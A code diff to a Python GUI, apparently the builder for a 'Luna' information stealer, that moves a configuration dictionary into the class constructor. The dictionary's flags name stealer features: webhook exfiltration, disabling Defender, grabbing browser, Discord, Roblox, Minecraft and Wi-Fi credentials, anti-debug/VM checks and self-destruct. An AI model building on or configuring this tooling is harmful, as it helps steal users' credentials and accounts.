@@ -36,6 +36,28 @@ class App(customtkinter.CTk):
         self.grid_columnconfigure(1, weight=1)
         self.dark_mode()
 
+        self.updated_dictionary = {
+            "webhook": None,
+            "ping": False,
+            "pingtype": None,
+            "error": False,
+            "startup": False,
+            "defender": False,
+            "systeminfo": False,
+            "backupcodes": False,
+            "browser": False,
+            "roblox": False,
+            "obfuscation": False,
+            "injection": False,
+            "minecraft": False,
+            "wifi": False,
+            "killprotector": False,
+            "antidebug_vm": False,
+            "discord": False,
+            "anti_spam": False,
+            "self_destruct": False
+        }
+
         image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
         self.basefilepath = os.path.dirname(str(os.path.realpath(__file__)))
         self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(60, 60))
@@ -305,28 +327,6 @@ class App(customtkinter.CTk):
                             font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
 
     def update_config(self, event):
-        self.updated_dictionary = {
-            "webhook": None,
-            "ping": False,
-            "pingtype": None,
-            "error": False,
-            "startup": False,
-            "defender": False,
-            "systeminfo": False,
-            "backupcodes": False,
-            "browser": False,
-            "roblox": False,
-            "obfuscation": False,
-            "injection": False,
-            "minecraft": False,
-            "wifi": False,
-            "killprotector": False,
-            "antidebug_vm": False,
-            "discord": False,
-            "anti_spam": False,
-            "self_destruct": False
-        }
-
         checkbox_mapping = {
             "webhook": self.webhook_button,
             "ping": self.ping,
